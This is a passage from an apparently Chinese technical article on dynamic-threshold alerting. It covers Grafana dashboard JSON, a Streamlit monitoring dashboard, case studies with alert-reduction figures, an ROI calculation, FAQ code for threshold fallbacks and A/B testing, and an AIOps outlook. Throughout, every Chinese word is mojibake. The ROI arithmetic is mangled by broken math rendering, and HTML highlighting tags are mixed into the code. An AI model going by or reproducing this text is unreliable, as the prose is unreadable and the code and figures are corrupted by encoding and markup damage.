              <span class="hljs-string">"matcher"</span>: {<span class="hljs-string">"id"</span>: <span class="hljs-string">"byName"</span>, <span class="hljs-string">"options"</span>: <span class="hljs-string">"ä¸Šç•Œ"</span>},
              <span class="hljs-string">"properties"</span>: [
                {<span class="hljs-string">"id"</span>: <span class="hljs-string">"color"</span>, <span class="hljs-string">"value"</span>: {<span class="hljs-string">"mode"</span>: <span class="hljs-string">"fixed"</span>, <span class="hljs-string">"fixedColor"</span>: <span class="hljs-string">"red"</span>}},
                {<span class="hljs-string">"id"</span>: <span class="hljs-string">"custom.lineStyle"</span>, <span class="hljs-string">"value"</span>: {<span class="hljs-string">"dash"</span>: [<span class="hljs-number">10</span>, <span class="hljs-number">10</span>]}}
              ]
            },
            {
              <span class="hljs-string">"matcher"</span>: {<span class="hljs-string">"id"</span>: <span class="hljs-string">"byName"</span>, <span class="hljs-string">"options"</span>: <span class="hljs-string">"ä¸‹ç•Œ"</span>},
              <span class="hljs-string">"properties"</span>: [
                {<span class="hljs-string">"id"</span>: <span class="hljs-string">"color"</span>, <span class="hljs-string">"value"</span>: {<span class="hljs-string">"mode"</span>: <span class="hljs-string">"fixed"</span>, <span class="hljs-string">"fixedColor"</span>: <span class="hljs-string">"red"</span>}},
                {<span class="hljs-string">"id"</span>: <span class="hljs-string">"custom.lineStyle"</span>, <span class="hljs-string">"value"</span>: {<span class="hljs-string">"dash"</span>: [<span class="hljs-number">10</span>, <span class="hljs-number">10</span>]}}
              ]
            }
          ]
        }
      },
      {
        <span class="hljs-string">"title"</span>: <span class="hljs-string">"å‘Šè­¦ç»Ÿè®¡"</span>,
        <span class="hljs-string">"targets"</span>: [
          {
            <span class="hljs-string">"query"</span>: <span class="hljs-string">"SELECT COUNT(*) FROM alerts WHERE time &gt; now() - 24h GROUP BY severity"</span>
          }
        ],
        <span class="hljs-string">"visualization"</span>: <span class="hljs-string">"piechart"</span>
      },
      {
        <span class="hljs-string">"title"</span>: <span class="hljs-string">"ç½®ä¿¡åº¦åˆ†å¸ƒ"</span>,
        <span class="hljs-string">"targets"</span>: [
          {
            <span class="hljs-string">"measurement"</span>: <span class="hljs-string">"dynamic_thresholds"</span>,
            <span class="hljs-string">"select"</span>: <span class="hljs-string">[["confidence", "ç½®ä¿¡åº¦"]]</span>
          }
        ],
        <span class="hljs-string">"visualization"</span>: <span class="hljs-string">"histogram"</span>
      }
    ]
  }
}
</code></pre>
<p>5.3.2 å®æ—¶ç›‘æ§è„šæœ¬</p>
<pre><code class="hljs language-ini" lang="ini">import streamlit as st
import pandas as pd
import plotly.graph_objects as go
from datetime import datetime, timedelta

class RealtimeMonitoringDashboard:
    """å®æ—¶ç›‘æ§ä»ªè¡¨æ¿"""
    
    def __init__(self, alerting_system):
        <span class="hljs-attr">self.system</span> = alerting_system
    
    def run(self):
        st.title("åŠ¨æ€é˜ˆå€¼å®æ—¶ç›‘æ§")
        
        <span class="hljs-comment"># ä¾§è¾¹æ ï¼šé€‰æ‹©æŒ‡æ ‡</span>
        <span class="hljs-attr">metric_name</span> = st.sidebar.selectbox(
            "é€‰æ‹©ç›‘æ§æŒ‡æ ‡",
            list(self.system.threshold_generators.keys())
        )
        
        <span class="hljs-comment"># ä¸»é¢æ¿ï¼šæ—¶åºå›¾</span>
        self._render_timeseries_chart(metric_name)
        
        <span class="hljs-comment"># ç»Ÿè®¡ä¿¡æ¯</span>
        col1, col2, <span class="hljs-attr">col3</span> = st.columns(<span class="hljs-number">3</span>)
        with col1:
            st.metric("24å°æ—¶å‘Šè­¦æ•°", self._get_alert_count(24))
        with col2:
            st.metric("å‘Šè­¦å‡†ç¡®ç‡", f"{self._get_precision():.1%}")
        with col3:
            st.metric("å¹³å‡ç½®ä¿¡åº¦", f"{self._get_avg_confidence():.2f}")
        
        <span class="hljs-comment"># æœ€è¿‘å‘Šè­¦åˆ—è¡¨</span>
        st.subheader("æœ€è¿‘å‘Šè­¦")
        self._render_recent_alerts()
    
    def _render_timeseries_chart(self, metric_name):
        """æ¸²æŸ“æ—¶åºå›¾"""
        <span class="hljs-comment"># ä»æ•°æ®åº“è·å–æœ€è¿‘24å°æ—¶æ•°æ®</span>
        <span class="hljs-attr">data</span> = self._fetch_data(metric_name, hours=<span class="hljs-number">24</span>)
        
        <span class="hljs-attr">fig</span> = go.Figure()
        
        <span class="hljs-comment"># å®é™…å€¼</span>
        fig.add_trace(go.Scatter(
            <span class="hljs-attr">x</span>=data[<span class="hljs-string">'timestamp'</span>],
            <span class="hljs-attr">y</span>=data[<span class="hljs-string">'current_value'</span>],
            <span class="hljs-attr">mode</span>=<span class="hljs-string">'lines'</span>,
            <span class="hljs-attr">name</span>=<span class="hljs-string">'å®é™…å€¼'</span>,
            <span class="hljs-attr">line</span>=dict(color=<span class="hljs-string">'blue'</span>, width=<span class="hljs-number">2</span>)
        ))
        
        <span class="hljs-comment"># é¢„æœŸå€¼</span>
        fig.add_trace(go.Scatter(
            <span class="hljs-attr">x</span>=data[<span class="hljs-string">'timestamp'</span>],
            <span class="hljs-attr">y</span>=data[<span class="hljs-string">'expected_value'</span>],
            <span class="hljs-attr">mode</span>=<span class="hljs-string">'lines'</span>,
            <span class="hljs-attr">name</span>=<span class="hljs-string">'é¢„æœŸå€¼'</span>,
            <span class="hljs-attr">line</span>=dict(color=<span class="hljs-string">'green'</span>, width=<span class="hljs-number">1</span>, dash=<span class="hljs-string">'dash'</span>)
        ))
        
        <span class="hljs-comment"># ä¸Šç•Œ</span>
        fig.add_trace(go.Scatter(
            <span class="hljs-attr">x</span>=data[<span class="hljs-string">'timestamp'</span>],
            <span class="hljs-attr">y</span>=data[<span class="hljs-string">'upper_bound'</span>],
            <span class="hljs-attr">mode</span>=<span class="hljs-string">'lines'</span>,
            <span class="hljs-attr">name</span>=<span class="hljs-string">'ä¸Šç•Œ'</span>,
            <span class="hljs-attr">line</span>=dict(color=<span class="hljs-string">'red'</span>, width=<span class="hljs-number">1</span>, dash=<span class="hljs-string">'dot'</span>)
        ))
        
        <span class="hljs-comment"># ä¸‹ç•Œ</span>
        fig.add_trace(go.Scatter(
            <span class="hljs-attr">x</span>=data[<span class="hljs-string">'timestamp'</span>],
            <span class="hljs-attr">y</span>=data[<span class="hljs-string">'lower_bound'</span>],
            <span class="hljs-attr">mode</span>=<span class="hljs-string">'lines'</span>,
            <span class="hljs-attr">name</span>=<span class="hljs-string">'ä¸‹ç•Œ'</span>,
            <span class="hljs-attr">line</span>=dict(color=<span class="hljs-string">'red'</span>, width=<span class="hljs-number">1</span>, dash=<span class="hljs-string">'dot'</span>),
            <span class="hljs-attr">fill</span>=<span class="hljs-string">'tonexty'</span>,
            <span class="hljs-attr">fillcolor</span>=<span class="hljs-string">'rgba(255,0,0,0.1)'</span>
        ))
        
        <span class="hljs-comment"># æ ‡è®°å‘Šè­¦ç‚¹</span>
        <span class="hljs-attr">alerts</span> = data[data[<span class="hljs-string">'is_alert'</span>] == <span class="hljs-literal">True</span>]
        fig.add_trace(go.Scatter(
            <span class="hljs-attr">x</span>=alerts[<span class="hljs-string">'timestamp'</span>],
            <span class="hljs-attr">y</span>=alerts[<span class="hljs-string">'current_value'</span>],
            <span class="hljs-attr">mode</span>=<span class="hljs-string">'markers'</span>,
            <span class="hljs-attr">name</span>=<span class="hljs-string">'å‘Šè­¦'</span>,
            <span class="hljs-attr">marker</span>=dict(color=<span class="hljs-string">'red'</span>, size=<span class="hljs-number">10</span>, symbol=<span class="hljs-string">'x'</span>)
        ))
        
        fig.update_layout(
            <span class="hljs-attr">title</span>=f<span class="hljs-string">"{metric_name} - åŠ¨æ€é˜ˆå€¼ç›‘æ§"</span>,
            <span class="hljs-attr">xaxis_title</span>=<span class="hljs-string">"æ—¶é—´"</span>,
            <span class="hljs-attr">yaxis_title</span>=<span class="hljs-string">"å€¼"</span>,
            <span class="hljs-attr">hovermode</span>=<span class="hljs-string">'x unified'</span>
        )
        
        st.plotly_chart(fig, <span class="hljs-attr">use_container_width</span>=<span class="hljs-literal">True</span>)
    
    def _render_recent_alerts(self):
        """æ¸²æŸ“æœ€è¿‘å‘Šè­¦åˆ—è¡¨"""
        <span class="hljs-attr">alerts</span> = self._fetch_recent_alerts(limit=<span class="hljs-number">10</span>)
        
        <span class="hljs-attr">df</span> = pd.DataFrame(alerts)
        df<span class="hljs-section">['timestamp']</span> = pd.to_datetime(df<span class="hljs-section">['timestamp']</span>)
        
        st.dataframe(
            df<span class="hljs-section">[['timestamp', 'metric', 'severity', 'deviation', 'confidence']]</span>,
            <span class="hljs-attr">use_container_width</span>=<span class="hljs-literal">True</span>
        )
</code></pre>
<h2 data-id="heading-25">å…­ã€çœŸå®æ¡ˆä¾‹ä¸æ•ˆæœè¯„ä¼°</h2>
<h3 data-id="heading-26">6.1 æ¡ˆä¾‹ä¸€ï¼šæŸç”µå•†å¹³å°</h3>
<p>èƒŒæ™¯ï¼š</p>
<ul>
<li>æ—¥å‡PV 5000ä¸‡</li>
<li>å¾®æœåŠ¡æ¶æ„ï¼Œ200+æœåŠ¡å®ä¾‹</li>
<li>åŸæœ‰å›ºå®šé˜ˆå€¼å‘Šè­¦ç³»ç»Ÿæ¯å¤©äº§ç”Ÿ800+å‘Šè­¦</li>
</ul>
<p>å®æ–½æ–¹æ¡ˆï¼š</p>
<ol>
<li>ä¸ºæ ¸å¿ƒæœåŠ¡ï¼ˆè®¢å•ã€æ”¯ä»˜ã€åº“å­˜ï¼‰éƒ¨ç½²åŠ¨æ€é˜ˆå€¼</li>
<li>é…ç½®7å¤©æ»‘åŠ¨çª—å£ï¼Œ24å°æ—¶å­£èŠ‚å‘¨æœŸ</li>
<li>æ³¨å†ŒåŒ11ã€618ç­‰å¤§ä¿ƒäº‹ä»¶</li>
</ol>
<p>æ•ˆæœå¯¹æ¯”ï¼š</p>









































<table><thead><tr><th>æŒ‡æ ‡</th><th>å®æ–½å‰</th><th>å®æ–½å</th><th>æ”¹å–„å¹…åº¦</th></tr></thead><tbody><tr><td>æ—¥å‡å‘Šè­¦æ•°</td><td>823</td><td>287</td><td>-65%</td></tr><tr><td>æœ‰æ•ˆå‘Šè­¦æ¯”ä¾‹</td><td>22%</td><td>68%</td><td>+209%</td></tr><tr><td>å¹³å‡å“åº”æ—¶é—´</td><td>18åˆ†é’Ÿ</td><td>6åˆ†é’Ÿ</td><td>-67%</td></tr><tr><td>è¯¯æŠ¥ç‡</td><td>78%</td><td>32%</td><td>-59%</td></tr><tr><td>æ•…éšœå‘ç°æ—¶é—´</td><td>å¹³å‡15åˆ†é’Ÿ</td><td>å¹³å‡3åˆ†é’Ÿ</td><td>-80%</td></tr></tbody></table>
<p>å…³é”®æ”¶ç›Šï¼š</p>
<ul>
<li>è¿ç»´äººå‘˜ä»"æ•‘ç«"è½¬å‘"ä¼˜åŒ–"</li>
<li>åŒ11æœŸé—´é›¶è¯¯æŠ¥ï¼Œæ‰€æœ‰å‘Šè­¦å‡ä¸ºçœŸå®é—®é¢˜</li>
<li>æå‰å‘ç°äº†3æ¬¡æ½œåœ¨çš„ç³»ç»Ÿç“¶é¢ˆ</li>
</ul>
<h3 data-id="heading-27">6.2 æ¡ˆä¾‹äºŒï¼šæŸSaaSå…¬å¸</h3>
<p>èƒŒæ™¯ï¼š</p>
<ul>
<li>B2B SaaSäº§å“ï¼Œå®¢æˆ·éå¸ƒå…¨çƒ</li>
<li>ä¸šåŠ¡å¢é•¿è¿…é€Ÿï¼ˆæœˆå¢é•¿30%ï¼‰</li>
<li>å›ºå®šé˜ˆå€¼æ— æ³•é€‚åº”å¿«é€Ÿå¢é•¿</li>
</ul>
<p>å®æ–½æ–¹æ¡ˆï¼š</p>
<ol>
<li>å¯ç”¨è‡ªé€‚åº”å­¦ä¹ ç³»ç»Ÿ</li>
<li>é›†æˆè¿ç»´äººå‘˜åé¦ˆæœºåˆ¶</li>
<li>æŒ‰å®¢æˆ·æ—¶åŒºé…ç½®ä¸åŒçš„å­£èŠ‚å‘¨æœŸ</li>
</ol>
<p>æ•ˆæœï¼š</p>
<ul>
<li>3ä¸ªæœˆå†…ï¼Œç³»ç»Ÿè‡ªåŠ¨å°†sigmaå€æ•°ä»3.0è°ƒæ•´åˆ°3.8</li>
<li>å‘Šè­¦å‡†ç¡®ç‡ä»45%æå‡åˆ°82%</li>
<li>æˆåŠŸé€‚åº”äº†ä¸šåŠ¡ä»10ä¸‡ç”¨æˆ·åˆ°50ä¸‡ç”¨æˆ·çš„å¢é•¿</li>
</ul>
<h3 data-id="heading-28">6.3 æŠ•èµ„å›æŠ¥ç‡ï¼ˆROIï¼‰åˆ†æ</h3>
<p>æˆæœ¬ï¼š</p>
<ul>
<li>å¼€å‘æˆæœ¬ï¼š2äººæœˆ</li>
<li>åŸºç¡€è®¾æ–½æˆæœ¬ï¼šæ—¶åºæ•°æ®åº“å­˜å‚¨ $200/æœˆ</li>
<li>ç»´æŠ¤æˆæœ¬ï¼š0.5äººæœˆ/å¹´</li>
</ul>
<p>æ”¶ç›Šï¼ˆå¹´åŒ–ï¼‰ï¼š</p>
<ul>
<li>å‡å°‘è¯¯æŠ¥èŠ‚çœçš„äººåŠ›ï¼š800å°æ—¶ Ã— <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>50</mn><mi mathvariant="normal">/</mi><mtext>å°æ—¶</mtext><mo>=</mo></mrow><annotation encoding="application/x-tex">50/å°æ—¶ = </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord">50/</span><span class="mord cjk_fallback">å°æ—¶</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span></span></span></span></span>40,000</li>
<li>æå‰å‘ç°æ•…éšœé¿å…çš„æŸå¤±ï¼šä¼°ç®— $100,000</li>
<li>æå‡è¿ç»´æ•ˆç‡çš„ä»·å€¼ï¼š$50,000</li>
</ul>
<p>ROI = (æ”¶ç›Š - æˆæœ¬) / æˆæœ¬ Ã— 100%</p>
<p>ROI = (<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>190</mn><mo separator="true">,</mo><mn>000</mn><mo>âˆ’</mo></mrow><annotation encoding="application/x-tex">190,000 - </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"/><span class="mord">190</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">000</span><span class="mord">âˆ’</span></span></span></span></span>12,400) / $12,400 Ã— 100% = 1,432%</p>
<h2 data-id="heading-29">ä¸ƒã€å¸¸è§é—®é¢˜ä¸è§£å†³æ–¹æ¡ˆ</h2>
<h3 data-id="heading-30">Q1: åŠ¨æ€é˜ˆå€¼ä¼šä¸ä¼š"ä¹ æƒ¯"å¼‚å¸¸çŠ¶æ€ï¼Ÿ</h3>
<p>é—®é¢˜æè¿°ï¼šå¦‚æœç³»ç»Ÿé•¿æœŸå¤„äºå¼‚å¸¸çŠ¶æ€ï¼ˆå¦‚å†…å­˜æ³„æ¼å¯¼è‡´å†…å­˜æŒç»­ä¸Šå‡ï¼‰ï¼ŒåŠ¨æ€é˜ˆå€¼ä¼šä¸ä¼šé€æ¸é€‚åº”è¿™ç§å¼‚å¸¸ï¼Œå¯¼è‡´æ— æ³•å‘Šè­¦ï¼Ÿ</p>
<p>è§£å†³æ–¹æ¡ˆï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AnomalyResistantThresholdGenerator</span>(<span class="hljs-title class_ inherited__">DynamicThresholdGenerator</span>):
    <span class="hljs-string">"""æŠ—å¼‚å¸¸æ±¡æŸ“çš„é˜ˆå€¼ç”Ÿæˆå™¨"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_preprocess_series</span>(<span class="hljs-params">self, values</span>):
        <span class="hljs-string">"""å¢å¼ºçš„é¢„å¤„ç†ï¼šæ£€æµ‹å¹¶ç§»é™¤æŒç»­å¼‚å¸¸"""</span>
        <span class="hljs-comment"># 1. åŸºç¡€é¢„å¤„ç†</span>
        values = <span class="hljs-built_in">super</span>()._preprocess_series(values)
        
        <span class="hljs-comment"># 2. æ£€æµ‹æŒç»­ä¸Šå‡è¶‹åŠ¿ï¼ˆå¯èƒ½æ˜¯å†…å­˜æ³„æ¼ï¼‰</span>
        <span class="hljs-keyword">if</span> self._detect_sustained_increase(values):
            <span class="hljs-comment"># ä½¿ç”¨æ›´æ—©æœŸçš„"å¥åº·"æ•°æ®</span>
            healthy_baseline = np.percentile(values[:<span class="hljs-built_in">len</span>(values)//<span class="hljs-number">2</span>], <span class="hljs-number">75</span>)
            <span class="hljs-comment"># å°†å¼‚å¸¸ä¸Šå‡éƒ¨åˆ†æ‹‰å›åˆ°å¥åº·åŸºçº¿</span>
            values = np.minimum(values, healthy_baseline * <span class="hljs-number">1.2</span>)
        
        <span class="hljs-keyword">return</span> values
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_detect_sustained_increase</span>(<span class="hljs-params">self, values, threshold=<span class="hljs-number">0.5</span></span>):
        <span class="hljs-string">"""æ£€æµ‹æŒç»­ä¸Šå‡ï¼ˆå¯èƒ½çš„å†…å­˜æ³„æ¼ç­‰ï¼‰"""</span>
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(values) &lt; <span class="hljs-number">48</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
        
        <span class="hljs-comment"># æ¯”è¾ƒå‰åä¸¤åŠçš„å‡å€¼</span>
        first_half_mean = np.mean(values[:<span class="hljs-built_in">len</span>(values)//<span class="hljs-number">2</span>])
        second_half_mean = np.mean(values[<span class="hljs-built_in">len</span>(values)//<span class="hljs-number">2</span>:])
        
        increase_rate = (second_half_mean - first_half_mean) / first_half_mean
        
        <span class="hljs-keyword">return</span> increase_rate &gt; threshold
</code></pre>
<h3 data-id="heading-31">Q2: å¦‚ä½•å¤„ç†çªå‘æµé‡ï¼ˆå¦‚çƒ­ç‚¹äº‹ä»¶ï¼‰ï¼Ÿ</h3>
<p>è§£å†³æ–¹æ¡ˆï¼šç»“åˆå®æ—¶æµé‡é¢„æµ‹</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">TrafficAwareDynamicThreshold</span>:
    <span class="hljs-string">"""æµé‡æ„ŸçŸ¥çš„åŠ¨æ€é˜ˆå€¼"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, threshold_gen, traffic_predictor</span>):
        self.threshold_gen = threshold_gen
        self.traffic_predictor = traffic_predictor
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">adjust_for_traffic</span>(<span class="hljs-params">self, base_thresholds, current_traffic</span>):
        <span class="hljs-string">"""æ ¹æ®å®æ—¶æµé‡è°ƒæ•´é˜ˆå€¼"""</span>
        <span class="hljs-comment"># é¢„æµ‹çš„æ­£å¸¸æµé‡</span>
        expected_traffic = self.traffic_predictor.predict()
        
        <span class="hljs-comment"># æµé‡å€æ•°</span>
        traffic_multiplier = current_traffic / expected_traffic
        
        <span class="hljs-keyword">if</span> traffic_multiplier &gt; <span class="hljs-number">2.0</span>:
            <span class="hljs-comment"># æµé‡æ¿€å¢ï¼Œæ”¾å®½é˜ˆå€¼</span>
            adjusted_thresholds = {
                <span class="hljs-string">'upper'</span>: base_thresholds[<span class="hljs-string">'upper'</span>] * traffic_multiplier * <span class="hljs-number">0.8</span>,
                <span class="hljs-string">'lower'</span>: base_thresholds[<span class="hljs-string">'lower'</span>],
                <span class="hljs-string">'note'</span>: <span class="hljs-string">f'æ£€æµ‹åˆ°<span class="hljs-subst">{traffic_multiplier:<span class="hljs-number">.1</span>f}</span>å€æµé‡ï¼Œé˜ˆå€¼å·²è°ƒæ•´'</span>
            }
            <span class="hljs-keyword">return</span> adjusted_thresholds
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">return</span> base_thresholds
</code></pre>
<h3 data-id="heading-32">Q3: æ•°æ®ä¸è¶³æ—¶å¦‚ä½•å¤„ç†ï¼Ÿ</h3>
<p>è§£å†³æ–¹æ¡ˆï¼šåˆ†å±‚é™çº§ç­–ç•¥</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_threshold_with_fallback</span>(<span class="hljs-params">metric_name, current_value, history_length</span>):
    <span class="hljs-string">"""åˆ†å±‚é™çº§çš„é˜ˆå€¼è·å–"""</span>
    <span class="hljs-keyword">if</span> history_length &gt;= <span class="hljs-number">168</span>:
        <span class="hljs-comment"># å±‚çº§1ï¼šå®Œæ•´çš„åŠ¨æ€é˜ˆå€¼ï¼ˆæœ€ä¼˜ï¼‰</span>
        <span class="hljs-keyword">return</span> dynamic_threshold_generator.get_thresholds()
    <span class="hljs-keyword">elif</span> history_length &gt;= <span class="hljs-number">48</span>:
        <span class="hljs-comment"># å±‚çº§2ï¼šç®€åŒ–çš„åŠ¨æ€é˜ˆå€¼ï¼ˆä½¿ç”¨ç§»åŠ¨å¹³å‡ï¼‰</span>
        <span class="hljs-keyword">return</span> simple_moving_average_threshold()
    <span class="hljs-keyword">elif</span> history_length &gt;= <span class="hljs-number">12</span>:
        <span class="hljs-comment"># å±‚çº§3ï¼šåŸºäºç™¾åˆ†ä½æ•°çš„é˜ˆå€¼</span>
        <span class="hljs-keyword">return</span> percentile_based_threshold(percentile=<span class="hljs-number">95</span>)
    <span class="hljs-keyword">else</span>:
        <span class="hljs-comment"># å±‚çº§4ï¼šä½¿ç”¨è¡Œä¸šé»˜è®¤å€¼</span>
        <span class="hljs-keyword">return</span> get_industry_default_threshold(metric_name)
</code></pre>
<h3 data-id="heading-33">Q4: å¦‚ä½•éªŒè¯åŠ¨æ€é˜ˆå€¼çš„æœ‰æ•ˆæ€§ï¼Ÿ</h3>
<p>è§£å†³æ–¹æ¡ˆï¼šA/Bæµ‹è¯•æ¡†æ¶</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ABTestingFramework</span>:
    <span class="hljs-string">"""A/Bæµ‹è¯•æ¡†æ¶"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        self.group_a_metrics = []  <span class="hljs-comment"># å›ºå®šé˜ˆå€¼ç»„</span>
        self.group_b_metrics = []  <span class="hljs-comment"># åŠ¨æ€é˜ˆå€¼ç»„</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run_test</span>(<span class="hljs-params">self, duration_days=<span class="hljs-number">30</span></span>):
        <span class="hljs-string">"""è¿è¡ŒA/Bæµ‹è¯•"""</span>
        <span class="hljs-comment"># éšæœºåˆ†é…50%æµé‡åˆ°åŠ¨æ€é˜ˆå€¼</span>
        <span class="hljs-keyword">for</span> metric <span class="hljs-keyword">in</span> all_metrics:
            <span class="hljs-keyword">if</span> random.random() &lt; <span class="hljs-number">0.5</span>:
                use_dynamic_threshold(metric)
                self.group_b_metrics.append(metric)
            <span class="hljs-keyword">else</span>:
                use_fixed_threshold(metric)
                self.group_a_metrics.append(metric)
        
        <span class="hljs-comment"># æ”¶é›†duration_dayså¤©çš„æ•°æ®</span>
        time.sleep(duration_days * <span class="hljs-number">86400</span>)
        
        <span class="hljs-comment"># ç»Ÿè®¡åˆ†æ</span>
        <span class="hljs-keyword">return</span> self.analyze_results()
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">analyze_results</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""åˆ†ææµ‹è¯•ç»“æœ"""</span>
        results = {
            <span class="hljs-string">'group_a'</span>: {
                <span class="hljs-string">'alert_count'</span>: self._count_alerts(self.group_a_metrics),
                <span class="hljs-string">'false_positive_rate'</span>: self._calc_fpr(self.group_a_metrics),
                <span class="hljs-string">'mttr'</span>: self._calc_mttr(self.group_a_metrics)
            },
            <span class="hljs-string">'group_b'</span>: {
                <span class="hljs-string">'alert_count'</span>: self._count_alerts(self.group_b_metrics),
                <span class="hljs-string">'false_positive_rate'</span>: self._calc_fpr(self.group_b_metrics),
                <span class="hljs-string">'mttr'</span>: self._calc_mttr(self.group_b_metrics)
            }
        }
        
        <span class="hljs-comment"># ç»Ÿè®¡æ˜¾è‘—æ€§æ£€éªŒ</span>
        p_value = self._statistical_test(results)
        
        <span class="hljs-keyword">return</span> {
            <span class="hljs-string">'results'</span>: results,
            <span class="hljs-string">'is_significant'</span>: p_value &lt; <span class="hljs-number">0.05</span>,
            <span class="hljs-string">'recommendation'</span>: <span class="hljs-string">'adopt_dynamic'</span> <span class="hljs-keyword">if</span> results[<span class="hljs-string">'group_b'</span>][<span class="hljs-string">'false_positive_rate'</span>] &lt; results[<span class="hljs-string">'group_a'</span>][<span class="hljs-string">'false_positive_rate'</span>] <span class="hljs-keyword">else</span> <span class="hljs-string">'keep_fixed'</span>
        }
</code></pre>
<h2 data-id="heading-34">å…«ã€æœªæ¥å±•æœ›ä¸æ¼”è¿›æ–¹å‘</h2>
<h3 data-id="heading-35">8.1 æœºå™¨å­¦ä¹ å¢å¼º</h3>
<p>æ–¹å‘ä¸€ï¼šæ·±åº¦å­¦ä¹ é¢„æµ‹æ¨¡å‹</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> torch
<span class="hljs-keyword">import</span> torch.nn <span class="hljs-keyword">as</span> nn

<span class="hljs-keyword">class</span> <span class="hljs-title class_">LSTMThresholdPredictor</span>(nn.Module):
    <span class="hljs-string">"""åŸºäºLSTMçš„é˜ˆå€¼é¢„æµ‹å™¨"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, input_size=<span class="hljs-number">1</span>, hidden_size=<span class="hljs-number">64</span>, num_layers=<span class="hljs-number">2</span></span>):
        <span class="hljs-built_in">super</span>().__init__()
        self.lstm = nn.LSTM(input_size, hidden_size, num_layers, batch_first=<span class="hljs-literal">True</span>)
        self.fc = nn.Linear(hidden_size, <span class="hljs-number">3</span>)  <span class="hljs-comment"># é¢„æµ‹ï¼šæœŸæœ›å€¼ã€ä¸Šç•Œã€ä¸‹ç•Œ</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, x</span>):
        lstm_out, _ = self.lstm(x)
        predictions = self.fc(lstm_out[:, -<span class="hljs-number">1</span>, :])
        <span class="hljs-keyword">return</span> predictions
</code></pre>
<p>æ–¹å‘äºŒï¼šå¼‚å¸¸æ£€æµ‹ç®—æ³•èåˆ</p>
<ul>
<li>Isolation Forestï¼šæ£€æµ‹ç¦»ç¾¤ç‚¹</li>
<li>Autoencoderï¼šå­¦ä¹ æ­£å¸¸æ¨¡å¼</li>
<li>One-Class SVMï¼šå•ç±»åˆ†ç±»</li>
</ul>
<h3 data-id="heading-36">8.2 AIOpsé›†æˆ</h3>
<p>åŠ¨æ€é˜ˆå€¼ â†’ å¼‚å¸¸æ£€æµ‹ â†’ æ ¹å› åˆ†æ â†’ è‡ªåŠ¨ä¿®å¤</p>
<p>å®Œæ•´çš„AIOpsé—­ç¯ï¼š</p>
<ol>
<li>æ£€æµ‹ï¼šåŠ¨æ€é˜ˆå€¼å‘ç°å¼‚å¸¸</li>
<li>è¯Šæ–­ï¼šå…³è”åˆ†ææ‰¾åˆ°æ ¹å› </li>
<li><strong>é¢„æµ‹</strong>ï¼šé¢„æµ‹æ•…éšœå‘å±•è¶‹åŠ¿<br/>
4.<strong>å†³ç­–</strong>ï¼šæ¨èä¿®å¤æ–¹æ¡ˆ<br/>
5.<strong>æ‰§è¡Œ</strong>ï¼šè‡ªåŠ¨åŒ–ä¿®å¤<br/>
6.<strong>å­¦ä¹ </strong>ï¼šä»ç»“æœä¸­æŒç»­ä¼˜åŒ–</li>
</ol>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AIOpsEngine</span>:
    <span class="hljs-string">"""AIOpsæ™ºèƒ½è¿ç»´å¼•æ“"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        self.anomaly_detector = DynamicThresholdGenerator()
        self.root_cause_analyzer = RootCauseAnalyzer()
        self.failure_predictor = FailurePredictor()
        self.auto_remediation = AutoRemediationEngine()
        self.knowledge_base = KnowledgeBase()
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_anomaly</span>(<span class="hljs-params">self, metric_data</span>):
        <span class="hljs-string">"""å¤„ç†å¼‚å¸¸çš„å®Œæ•´æµç¨‹"""</span>
        <span class="hljs-comment"># 1. å¼‚å¸¸æ£€æµ‹</span>
        anomaly_result = self.anomaly_detector.update_and_get_thresholds(
            metric_data[<span class="hljs-string">'value'</span>], 
            metric_data[<span class="hljs-string">'timestamp'</span>]
        )
        
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> anomaly_result[<span class="hljs-string">'is_alert'</span>]:
            <span class="hljs-keyword">return</span> {<span class="hljs-string">'status'</span>: <span class="hljs-string">'normal'</span>}
        
        <span class="hljs-comment"># 2. æ ¹å› åˆ†æ</span>
        root_cause = self.root_cause_analyzer.analyze(
            anomaly_result,
            context=self._gather_context(metric_data)
        )
        
        <span class="hljs-comment"># 3. æ•…éšœé¢„æµ‹</span>
        prediction = self.failure_predictor.predict_impact(
            root_cause,
            time_horizon=<span class="hljs-number">3600</span>  <span class="hljs-comment"># é¢„æµ‹æœªæ¥1å°æ—¶</span>
        )
        
